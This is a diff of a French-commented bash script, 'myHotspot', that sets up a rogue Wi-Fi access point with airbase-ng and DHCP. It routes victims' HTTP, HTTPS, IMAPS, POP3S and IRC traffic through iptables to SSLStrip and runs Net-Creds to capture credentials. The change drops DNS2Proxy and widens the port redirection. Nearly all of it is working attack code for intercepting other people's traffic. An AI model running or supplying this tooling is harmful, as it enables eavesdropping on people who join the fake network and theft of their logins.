@@ -1,6 +1,11 @@
 #!/bin/bash
 # Copyright (C) 2015 - Nyzo
-# myHotspot - version 1.0
+# myHotspot - version 1.2
+
+if [[ $EUID -ne 0 ]]; then
+  echo "Vous devez être en root (su root)" 2>&1
+  exit 1
+fi
 
 #Initialisation paramètres console
 txtrst="\e[0m"  #Réinitialisation du texte, blanc
@@ -9,14 +14,6 @@ q="\e[0;32m"    #Question, vert
 info="\e[0;33m" #Info, jaune
 
 init_fn() {
-
-#Nettoyage avant lancement du script
-iptables --flush
-iptables -t nat --flush
-iptables -t mangle --flush
-iptables -X
-iptables -t nat -X
-iptables -t mangle -X
 
 #Vérification des installations
 #DHCP
@@ -48,7 +45,7 @@ fi
 
 # Initialisation
 echo
-echo " - myHotspot - Version 1.1  - Par Nyzo - "
+echo " - myHotspot - Version 1.2  - Par Nyzo - "
 echo
 route -n -A inet | grep UG
 echo
@@ -63,6 +60,7 @@ read -e ESSID
 airmon-ng start $fakeap_interface
 fakeap=$fakeap_interface
 fakeap_interface="mon0"
+listenport="10000"
 setup_fn
 echo -e -n "$txtrst\n"
 }
@@ -89,8 +87,6 @@ range 10.0.0.20 10.0.0.50;
 
 }" > /pentest/wireless/myhotspot/dhcpd.conf
 
-unset SESSION_MANAGER
-
 # Création du point d'accès wifi
 echo -e "$info\n[+]Configuration du point d'accès wifi $warn"
 xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "myHotspot - $ESSID - $fakeap - $fakeap_interface" -e airbase-ng --essid "$ESSID" -c 1 $fakeap_interface & fakeapid=$!
@@ -106,16 +102,19 @@ ifconfig at0 10.0.0.1 netmask 255.255.255.0
 ifconfig at0 mtu 1400
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 iptables --flush
-iptables --table nat --flush
+iptables --flush --table nat
 iptables --delete-chain
 iptables --table nat --delete-chain
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip
 iptables -P FORWARD ACCEPT
 iptables --append FORWARD --in-interface at0 -j ACCEPT
-iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
-iptables --table nat --append PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
-iptables --table nat --append PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+iptables --table nat -A POSTROUTING --out-interface $internet_interface -j MASQUERADE
+iptables --table nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $listenport
+iptables --table nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports $listenport #HTTPS
+iptables --table nat -A PREROUTING -p tcp --destination-port 993 -j REDIRECT --to-ports $listenport #IMAPS
+iptables --table nat -A PREROUTING -p tcp --destination-port 995 -j REDIRECT --to-ports $listenport #POP3S
+iptables --table nat -A PREROUTING -p tcp --destination-port 6697 -j REDIRECT --to-ports $listenport # IRC
 sleep 3
 
 # DHCP
@@ -124,23 +123,14 @@ chmod 777 /var/run/
 touch /var/run/dhcpd.pid
 chmod 777 /var/run/dhcpd.pid
 chown dhcpd:dhcpd /var/run/dhcpd.pid
-xterm -xrm '*hold: true' -geometry 75x20+1+100 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/myhotspot/dhcpd.conf" at0 & dchpid=$!
+xterm -xrm '*hold: true' -geometry 75x20+1+240 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/myhotspot/dhcpd.conf" at0 & dchpid=$!
 disown
 sleep 3
 
 # SSLStrip
 echo -e "$info\n[+]Configuration et démarrage de SSLStrip $warn"
-xterm -geometry 125x30+5+400 -T SSLStrip -e sslstrip --favicon -p -k 10000 --write sslstrip.log & sslstripid=$!
+xterm -geometry 75x20+1+525 -T "SSLStrip" -e sslstrip --favicon -p -k 10000 & sslstripid=$!
 sleep 3
-
-cd /etc/dns2proxy
-# DNS2Proxy
-echo -e "$info\n[+]Configuration et démarrage de DNS2Proxy $warn"
-xterm -xrm '*hold: true' -geometry 125x30+5+500 -T DNS2Proxy -e python dns2proxy.py & dns2proxyid=$!
-disown
-sleep 1
-cd /etc/myHotspot
-sleep 1
 
 # Net-Creds
 echo -e "$info\n[+]Configuration et démarrage de Net-Creds $warn"
@@ -172,19 +162,16 @@ echo -e "$info[+] SSLStrip stoppé $warn"
 kill ${sslstripid}
 echo -e "$info[+] Net-Creds stoppé $warn"
 kill ${netcredsid}
-echo -e "$info[+] DNS2Proxy stoppé $info\n"
-kill ${dns2proxyid}
 sleep 1
 
-echo -e "[+] Airmon-ng stoppé $txtrst\n"
+echo -e "$info[+] Airmon-ng stoppé $txtrst\n"
 sleep 1
-echo
 echo "0" > /proc/sys/net/ipv4/ip_forward
-iptables --flush
-iptables --table nat --flush
+iptables -F
+iptables -F -t nat
 iptables --delete-chain
-iptables --table nat --delete-chain
-echo -e "$info\n[+] iptables restaurée $txtrst\n"
+iptables -t nat --delete-chain
+echo -e "$info[+] iptables restaurée $txtrst\n"
 sleep 1
 airmon-ng stop $fakeap_interface
 airmon-ng stop $fakeap
